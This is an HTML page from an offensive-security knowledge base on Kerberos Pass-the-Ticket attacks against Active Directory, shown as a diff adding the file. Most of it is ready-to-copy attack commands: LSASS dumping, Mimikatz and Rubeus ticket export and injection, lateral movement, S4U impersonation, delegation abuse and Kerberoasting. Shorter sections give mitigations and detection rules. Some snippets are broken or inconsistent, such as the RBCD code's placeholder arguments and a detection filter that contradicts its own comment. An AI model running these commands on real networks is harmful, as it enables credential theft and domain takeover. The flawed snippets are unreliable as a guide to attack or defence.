@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pass-the-Ticket | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Active Directory</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Active Directory</a> / Pass-the-Ticket
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | T1550.003</span>
+      <h1>🎫 Pass-the-Ticket (PtT)</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1550.003</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows AD</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Lateral Movement</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy-Medium</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Pass-the-Ticket (PtT) is a lateral movement technique that extracts Kerberos tickets from memory and uses them to authenticate to other services. Unlike Pass-the-Hash which uses NTLM hashes, PtT uses Kerberos tickets (TGT or TGS) obtained from the LSASS process.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why PtT is Effective:</strong>
+        <ul>
+          <li><strong>Kerberos Authentication:</strong> Tickets grant access without re-authentication</li>
+          <li><strong>Memory Storage:</strong> Tickets cached in lsass.exe for single sign-on</li>
+          <li><strong>Cross-Platform:</strong> Works across forests and trust relationships</li>
+          <li><strong>Stealthy:</strong> No cleartext password stored or transmitted</li>
+          <li><strong>Long-Lasting:</strong> TGTs valid for hours, can be renewed</li>
+        </ul>
+      </div>
+
+      <p><strong>Kerberos Ticket Types:</strong></p>
+      <ul>
+        <li><strong>TGT (Ticket Granting Ticket):</strong> Valid for authentication to KDC</li>
+        <li><strong>TGS (Ticket Granting Service):</strong> Valid for specific service access</li>
+        <li><strong>Silver Ticket:</strong> Forged TGS for specific service</li>
+        <li><strong>Golden Ticket:</strong> Forged TGT with krbtgt hash</li>
+      </ul>
+    </div>
+
+    <!-- 2. TICKET EXTRACTION -->
+    <div class="content-section" id="extraction">
+      <h2>🔍 Ticket Extraction</h2>
+      
+      <p><strong>Mimikatz - Extract All Tickets:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Extract tickets from memory
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+
+# Export to .kirbi files
+sekurlsa::tickets /export
+
+# Extract TGTs only
+sekurlsa::tgt /export</pre>
+      </div>
+
+      <p><strong>From LSASS Dump:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create lsass dump
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Extract tickets from dump
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::tickets /export" "exit"
+
+# Or use sekurlsa directly
+sekurlsa::minidump lsass.dmp
+sekurlsa::tickets</pre>
+      </div>
+
+      <p><strong>Rubeus - Harvest Tickets:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Dump all tickets
+.\Rubeus.exe dump /nowrap
+
+# Filter by user
+.\Rubeus.exe dump /user:administrator /nowrap
+
+# Output to file
+.\Rubeus.exe dump /output:creds.txt
+
+# Monitor for new tickets
+.\Rubeus.exe monitor /interval:5</pre>
+      </div>
+
+      <p><strong>PowerShell - Native Methods:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using klist (limited extraction)
+klist
+
+# Using Kekeo
+misc::mst
+
+# Using Seatbelt
+.\Seatbelt.exe Tickets
+
+# Using SharpDPAPI
+SharpDPAPI.exe tickets</pre>
+      </div>
+    </div>
+
+    <!-- 3. TICKET INJECTION -->
+    <div class="content-section" id="injection">
+      <h2>💣 Ticket Injection & Usage</h2>
+      
+      <p><strong>Mimikatz - Pass the Ticket:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Inject ticket into current session
+mimikatz.exe
+privilege::debug
+kerberos::ptt ticket.kirbi
+
+# List injected tickets
+kerberos::list
+
+# Purge tickets
+kerberos::purge</pre>
+      </div>
+
+      <p><strong>Rubeus - Pass the Ticket:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Inject ticket
+.\Rubeus.exe ptt /ticket:base64ticket
+
+# Or from file
+.\Rubeus.exe ptt /ticket:path/to/ticket.kirbi
+
+# S4U/self (self ticket to access own services)
+.\Rubeus.exe s4u /ticket:base64ticket /impersonateuser:targetuser /targetserver:dc01.corp.com /rc4:hash</pre>
+      </div>
+
+      <p><strong>Cross-Domain Ticket Usage:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If you have a TGT for one domain but need access to trusted domain
+# Use ticket between forests
+
+# Inject cross-realm TGT
+kerberos::ptt crossrealm_tgt.kirbi
+
+# Or use S4U2Self to get ticket for target user
+.\Rubeus.exe s4u /user:sourceuser /ticket:user_tgt.kirbi /tgs:krbtgt_tgs.kirbi</pre>
+      </div>
+    </div>
+
+    <!-- 4. LATERAL MOVEMENT -->
+    <div class="content-section" id="lateral">
+      <h2>🚀 Lateral Movement with Tickets</h2>
+      
+      <p><strong>Using Injected Ticket:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># After injecting ticket, access resources
+dir \\targetserver\C$
+dir \\dc01.corp.com\C$\Windows
+
+# Using PsExec with ticket
+.\PsExec.exe \\target cmd.exe
+
+# Using WMI
+Get-WmiObject -Class Win32_Process -ComputerName target -Credential (New-Object System.Management.Automation.PSCredential("$env:USERDOMAIN\$env:USERNAME", (ConvertTo-SecureString "dummy" -AsPlainText -Force)))
+
+# Using PowerShell Remoting
+Enter-PSSession -ComputerName target -Authentication Kerberos</pre>
+      </div>
+
+      <p><strong>Request Service Ticket (S4U):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># S4U2Self - get ticket as any user
+# (requires unconstrained delegation or RC4 hash)
+.\Rubeus.exe s4u /user:source /rc4:hash /impersonateuser:target /targetserver:target.corp.com
+
+# S4U2Proxy - use user's ticket to access service
+# (requires service has trusted delegation)
+.\Rubeus.exe s4u /ticket:user_tgt.kirbi /tgs:service_tgs.kirbi /createnetonly:C:\Windows\System32\cmd.exe</pre>
+      </div>
+
+      <p><strong>Kerberoasting with Ticket:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If you have user's TGT, request TGS for any SPN
+.\Rubeus.exe kerberoast /user:target /ticket:user_tgt.kirbi /outfile:hashes.txt
+
+# Or ask for specific service
+.\Rubeus.exe kerberoast /spn:mssqlsvc/dbserver.corp.com /ticket:admin_tgt.kirbi</pre>
+      </div>
+    </div>
+
+    <!-- 5. DELEGATION ATTACKS -->
+    <div class="content-section" id="delegation">
+      <h2>⛓️ Delegation-Based PtT</h2>
+      
+      <p><strong>Unconstrained Delegation Exploitation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find servers with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# If you compromise such a server, capture TGTs
+mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+
+# Wait for admin to authenticate to compromised server
+# Their TGT will be saved in memory</pre>
+      </div>
+
+      <p><strong>Resource-Based Constrained Delegation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find RBCD configured computers
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherAccount | 
+    Where-Object { $_.msDS-AllowedToActOnBehalfOfOtherAccount } | 
+    Select-Object Name, msDS-AllowedToActOnBehalfOfOtherAccount
+
+# If you can modify msDS-AllowedToActOnBehalfOfOtherAccount, add your computer
+$target = Get-ADComputer target-server
+$attacker = Get-ADComputer attacker-server
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor($target."msDS-AllowedToActOnBehalfOfOtherAccount", $false)
+$SD.DiscretionaryAcl.RemoveAccess(Type, Principal, AccessMask, Inherited, ObjectInherit, Propagation)
+
+Set-ADComputer target-server -PrincipalsAllowedToDelegateToAccount $attacker</pre>
+      </div>
+
+      <p><strong>S4U2Self Exploitation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If you have control over account with S4U2Self rights
+# Use that to get ticket for ANY user to a service
+
+# Using Rubeus
+.\Rubeus.exe s4u /user:compromised$ /rc4:rc4hash /impersonateuser:administrator /targetserver:targetservice.corp.com
+
+# Result: TGS for administrator to target service, even without administrator authenticating</pre>
+      </div>
+    </div>
+
+    <!-- 6. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Domain Admin Access:</strong> Use admin's TGT to access domain resources</li>
+          <li><strong>Cross-Domain:</strong> Pivot between forests using trust tickets</li>
+          <li><strong>Persistence:</strong> Tickets valid for hours, no re-auth needed</li>
+          <li><strong>Silent Access:</strong> No password to crack, just use ticket</li>
+          <li><strong>Delegation Abuse:</strong> Escalate via constrained/unconstrained delegation</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 7. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Controls:</strong>
+        <ul>
+          <li><strong>Disable Unconstrained Delegation:</strong> Set computers to not trust for delegation</li>
+          <li><strong>Enable Resource-Based Constrained Delegation:</strong> More restrictive</li>
+          <li><strong>Protect Sensitive Accounts:</strong> Enable Kerberos Armoring (RC4 disabled)</li>
+          <li><strong>Monitor Ticket Requests:</strong> Alert on unusual S4U usage</li>
+          <li><strong>Regular Audit:</strong> Find accounts with delegation rights</li>
+          <li><strong>Credential Guard:</strong> Prevent ticket extraction from memory</li>
+        </ul>
+      </div>
+
+      <p><strong>PowerShell - Audit Delegation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} | 
+    Select-Object Name, SamAccountName | Export-Csv unconstrained.csv
+
+# Find constrained delegation
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne $null} | 
+    Select-Object Name, msDS-AllowedToDelegateTo
+
+# Find users with delegation
+Get-ADUser -Filter {DelegationEnabled -eq $true}</pre>
+      </div>
+
+      <p><strong>Disable Unconstrained Delegation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Set computer to not trusted for delegation
+Set-ADComputer -Identity Server01 -TrustedForDelegation $false
+
+# Or via GUI
+# ADUC > Computer Properties > Account > Trust this computer for delegation > No</pre>
+      </div>
+    </div>
+
+    <!-- 8. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>S4U2Self Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Event ID 4768 - TGT Requested
+# Event ID 4769 - TGS Requested (service for user)
+# Look for Ticket Encryption Type: 0x17 (RC4) or 0x1E (AES)
+
+# Detect S4U2Self usage (Event ID 4769)
+# Check for Accounts whose tickets were used:
+# - Service Name: krbtgt (S4U2Self)
+# - Account Name: targetuser (impersonated user)
+
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} | 
+    Where-Object { $_.Message -match 'krbtgt' -and $_.Message -match 'Ticket Encryption Type.*23' } | 
+    Select-Object TimeCreated, Properties</pre>
+      </div>
+
+      <p><strong>Sysmon - Ticket Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Sysmon Event ID 10 - ProcessAccess
+# Monitor for lsass access
+<ProcessAccess condition="contains">lsass.exe</ProcessAccess>
+
+# Sysmon Event ID 1 - Process Create
+# Alert on mimikatz, rubeus, kekeo
+<ProcessCreate condition="contains">mimikatz.exe</ProcessCreate>
+<ProcessCreate condition="contains">rubeus.exe</ProcessCreate>
+<ProcessCreate condition="contains">kekeo.exe</ProcessCreate></pre>
+      </div>
+
+      <p><strong>Sigma Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Detect Kerberos ticket export
+title: Kerberos Ticket Export
+id: ticket-export
+detection:
+  keywords:
+    - 'mimikatz'
+    - 'sekurlsa::tickets'
+    - 'lsass.exe'
+    - '.kirbi'
+  condition: keywords
+level: high</pre>
+      </div>
+    </div>
+
+    <!-- 9. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <ul>
+        <li><strong>Mimikatz:</strong> Ticket extraction, injection, golden ticket</li>
+        <li><strong>Rubeus:</strong> Comprehensive PtT, S4U, monitoring</li>
+        <li><strong>Kekeo:</strong> Ticket manipulation and generation</li>
+        <li><strong>PowerSploit:</strong> Kerberos module for ticket operations</li>
+        <li><strong>SharpMapExec:</strong> C# implementation for offensive ops</li>
+        <li><strong>Impacket:</strong> Linux-based Kerberos tools</li>
+      </ul>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-pass-the-hash/" target="_blank">PtH is Dead - Harmj0y</a></li>
+        <li><a href="https:// blog.stealthbits.com/unconstrained-delegation-abuse/" target="_blank">Unconstrained Delegation</a></li>
+        <li><a href="https:// github.com/GhostPack/Rubeus" target="_blank">Rubeus GitHub</a></li>
+        <li><a href="https:// docs.microsoft.com/en-us/windows/security/identity-protection/kerberos/kerberos-authentication" target="_blank">Kerberos Authentication</a></li>
+        <li><a href="https://specterops.io/resources" target="_blank">BloodHound and Kerberos</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
